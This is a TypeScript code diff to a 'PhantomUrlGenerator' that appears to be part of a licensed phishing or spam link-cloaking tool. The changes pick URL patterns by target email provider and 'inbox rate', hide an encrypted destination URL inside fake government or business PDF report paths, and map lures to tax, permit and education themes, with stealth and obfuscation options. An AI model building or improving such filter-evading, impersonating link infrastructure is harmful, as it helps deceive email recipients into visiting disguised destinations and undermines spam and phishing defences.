@@ -6,6 +6,7 @@ import { cacheManager } from './cacheManager';
 import { optionalAnalytics } from './optionalAnalytics';
 import { getLocalPatterns } from '@/data/localPatterns';
 import { hybridPatternManager } from './hybridPatternManager';
+import { InboxSafePatternManager, PatternSelectionCriteria } from './patterns/inboxSafePatternManager';
 
 export interface PhantomUrlOptions {
   pattern?: 'document' | 'business' | 'content' | 'legacy' | 'auto' | 'intelligent' | 'microsoft' | 'google' | 'mimicry';
@@ -105,14 +106,29 @@ export class PhantomUrlGenerator {
     // AI integration removed - proceeding with enhanced pattern selection
 
     try {
-      // Get intelligent pattern recommendation from local patterns
-      const optimalPattern = await hybridPatternManager.selectOptimalPattern(context);
+      // CRITICAL: Use inbox-safe patterns for better email delivery
+      const inboxSafeManager = InboxSafePatternManager.getInstance();
+
+      // Convert context to inbox-safe criteria
+      const selectionCriteria: PatternSelectionCriteria = {
+        targetProvider: context.targetProvider as any,
+        campaignType: this.mapCategoryToCampaignType(context.category),
+        minTrustScore: 90, // High trust score for inbox delivery
+        minInboxRate: 85,  // High inbox rate requirement
+        preferredTier: 1,  // Prefer tier 1 patterns
+        avoidSuspiciousPatterns: true
+      };
+
+      const optimalPattern = inboxSafeManager.selectOptimalPattern(selectionCriteria);
 
       if (!optimalPattern) {
-        throw new Error('No suitable pattern found');
+        console.warn('[PhantomURL] No inbox-safe pattern found, falling back to legacy');
+        return this.generateLegacyFallback(originalUrl, licenseKeyId, options);
       }
 
-      // Use base domain for all URLs
+      console.log(`[PhantomURL] Selected inbox-safe pattern: ${optimalPattern.name} (Trust: ${optimalPattern.trustScore})`);
+
+      // Use the inbox-safe pattern template
       const finalUrl = optimalPattern.template;
 
       // Use enhanced encryption with AES-256-GCM
@@ -133,12 +149,18 @@ export class PhantomUrlGenerator {
         encrypted = this.applyPlanBObfuscation(encrypted);
       }
 
-      // CRITICAL FIX: Generate dynamic parameters for the pattern
-      const dynamicParams = this.generateDynamicParameters(optimalPattern, context);
-      console.log(`[PhantomURL] Generated ${Object.keys(dynamicParams).length} dynamic parameters:`, dynamicParams);
+      // CRITICAL: Use inbox-safe parameter generation
+      const urlResult = inboxSafeManager.generateCompleteUrl(optimalPattern, encrypted, {
+        category: optimalPattern.category,
+        industry: context.industry,
+        targetProvider: context.targetProvider,
+        campaignType: this.mapCategoryToCampaignType(context.category)
+      });
 
-      // Build URL with dynamic parameters
-      let phantomUrl = this.buildIntelligentUrl(finalUrl, encrypted, dynamicParams);
+      console.log(`[PhantomURL] Generated inbox-safe URL with ${Object.keys(urlResult.parameters).length} parameters`);
+
+      // Use the complete URL from inbox-safe manager
+      let phantomUrl = urlResult.finalUrl;
 
       // The URL should be relative - frontend will add window.location.origin
       console.log(`[PhantomURL] Generated relative URL: ${phantomUrl}`);
@@ -249,10 +271,10 @@ export class PhantomUrlGenerator {
 
       return {
         url: phantomUrl,
-        pattern: pattern.template,
-        tier: pattern.tier,
-        expectedSuccessRate: pattern.successRate,
-        contentType: pattern.contentType,
+        pattern: optimalPattern.name,
+        tier: optimalPattern.tier,
+        expectedSuccessRate: optimalPattern.inboxRate, // Use inbox rate as success rate
+        contentType: 'application/pdf', // Most inbox-safe patterns use PDF
         encryptionMode: encryptionResult.mode,
         securityLevel
       };
@@ -310,6 +332,59 @@ export class PhantomUrlGenerator {
     // Add time-based salt prefix
     const hourSalt = Math.floor(Date.now() / 3600000).toString(36);
     return `${hourSalt}${encrypted}`;
+  }
+
+  /**
+   * Map category to campaign type for inbox-safe patterns
+   */
+  private mapCategoryToCampaignType(category?: string): 'business' | 'government' | 'education' | undefined {
+    if (!category) return undefined;
+
+    const categoryLower = category.toLowerCase();
+    if (categoryLower.includes('gov') || categoryLower.includes('tax') || categoryLower.includes('permit')) {
+      return 'government';
+    }
+    if (categoryLower.includes('edu') || categoryLower.includes('school') || categoryLower.includes('university')) {
+      return 'education';
+    }
+    return 'business';
+  }
+
+  /**
+   * Generate legacy fallback when inbox-safe patterns fail
+   */
+  private async generateLegacyFallback(
+    originalUrl: string,
+    licenseKeyId: string,
+    options: { stealthLevel: string; encryptionMode: string }
+  ): Promise<PhantomUrlResult> {
+    console.warn('[PhantomURL] Using legacy fallback pattern');
+
+    // Use a safe government-style pattern as fallback
+    const fallbackTemplate = '/documents/report-{year}.pdf?dept={department}&version={version}';
+
+    const encryptionResult = await enhancedEncryption.encryptUrl(
+      originalUrl,
+      licenseKeyId,
+      fallbackTemplate,
+      options.encryptionMode as 'aes' | 'xor' | 'auto'
+    );
+
+    const year = new Date().getFullYear().toString();
+    const department = 'finance';
+    const version = '1.0';
+
+    const fallbackUrl = `/documents/report-${year}.pdf?dept=${department}&version=${version}&data=${encryptionResult.encrypted}`;
+
+    return {
+      url: fallbackUrl,
+      pattern: 'legacy-fallback',
+      tier: 1,
+      expectedSuccessRate: 85,
+      contentType: 'application/pdf',
+      encryptionMode: encryptionResult.mode,
+      securityLevel: 5
+    };
   }
 
   private applyPlanBObfuscation(encrypted: string): string {
